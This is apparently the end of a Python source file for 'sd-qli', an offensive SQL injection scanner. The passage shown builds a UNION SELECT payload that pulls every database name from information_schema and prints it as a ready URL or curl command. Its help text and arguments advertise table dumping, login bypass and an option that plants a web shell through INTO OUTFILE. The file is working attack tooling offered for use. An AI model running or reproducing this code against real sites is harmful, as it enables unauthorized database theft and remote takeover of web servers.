        if self.results['os_shell']: print(f"{Colors.GREEN}[+] OS Shell: {self.results['shell_url']}{Colors.END}")
        
        if 'union_info' in self.results:
            u = self.results['union_info']
            print(f"\n{Colors.YELLOW}[*] Data Exfiltration (Manual Audit){Colors.END}")
            mk = "SD_DBS" ; tcols = [f"'{i}'" for i in range(1, u['count'] + 1)]
            tcols[u['reflected'][0]-1] = f"CONCAT('{mk}',(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'{mk}')"
            ex_payload = f"99999' UNION SELECT {','.join(tcols)}-- -"
            if self.method == 'GET': print(f"  Fetch DBs: {self.url}?{u['param']}={urllib.parse.quote(ex_payload)}")
            else: print(f"  Fetch DBs: curl -X POST -d \"{u['param']}={ex_payload}\" {self.url}")
        print("="*75)

def main():
    parser = argparse.ArgumentParser(
        description='sd-qli v3.5 - Ultimate Industrial SQL Injection Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════╗
║                     QUICK EXAMPLES                       ║
╚══════════════════════════════════════════════════════════╝

BASIC SCAN:
  python3 sd-qli.py -u "http://target.com/index.php?id=1"

FULL AUDIT (Databases -> Tables -> Columns -> Dump):
  python3 sd-qli.py -u "http://target.com/news.php?id=1" --dbs --dump-all

SPECIFIC TARGETING:
  python3 sd-qli.py -u "http://target.com/news.php?id=1" -D users_db -T admin_table --dump

POST REQUEST (Aggressive Login Bypass Check):
  python3 sd-qli.py -u "http://target.com/login.php" --data "user=admin&pass=123"

RAW REQUEST FILE (Saved from Burp/Zap):
  python3 sd-qli.py -r request.txt

╔══════════════════════════════════════════════════════════╗
║                    FLAG DESCRIPTIONS                     ║
╚══════════════════════════════════════════════════════════╝

TARGETING:
  -u, --url       Target URL. Must include http:// or https://.
  -r, --request   Load HTTP request from a file (Raw format). 
                  Parses headers, cookies, and data automatically.
  -m, --method    HTTP Method (GET, POST). Default: GET.
  -d, --data      POST data string (e.g., "id=1&debug=on").

ENUMERATION:
  --dbs           Enumerate available database names.
  --tables        Enumerate tables in the current (or specified) DB.
  --columns       Enumerate columns in the specified table.
  --dump          Dump table entries (default: 20 rows).

SPECIFICITY:
  -D              Target Database to enumerate.
  -T              Target Table to enumerate.
  -C              Target Columns (comma-separated).

EXPLOITATION:
  --os-shell      Attempt to write a Web Shell via INTO OUTFILE (Danger).

PERFORMANCE:
  -w, --workers   Number of concurrent threads (Default: 10).
        """
    )
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-m', '--method', default='GET', help='Method')
    parser.add_argument('-d', '--data', help='POST data')
    parser.add_argument('-r', '--request', help='Raw request file')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Threads')
    parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
    parser.add_argument('--tables', action='store_true', help='Enumerate tables')
    parser.add_argument('--columns', action='store_true', help='Enumerate columns')
    parser.add_argument('--dump', action='store_true', help='Dump table entries')
    parser.add_argument('--os-shell', action='store_true', help='Attempt Web Shell')
    parser.add_argument('-D', dest='db', help='Target Database')
    parser.add_argument('-T', dest='table', help='Target Table')
    parser.add_argument('-C', dest='col', help='Target Columns')
    
    args = parser.parse_args()
    headers, url, method, data = None, args.url, args.method, args.data
    if args.request:
        info = SDQLi.parse_request_file(args.request)
        if info: url, method, data, headers = info['url'], info['method'], info['data'], info['headers']
        else: sys.exit(1)
    if not url: parser.print_help() ; sys.exit(1)
    scanner = SDQLi(url, method=method, data=data, headers=headers, workers=args.workers, args=args)
    try: scanner.run()
    except KeyboardInterrupt: print(f"\n{Colors.RED}[!] Interrupted.{Colors.END}")

if __name__ == "__main__": main()
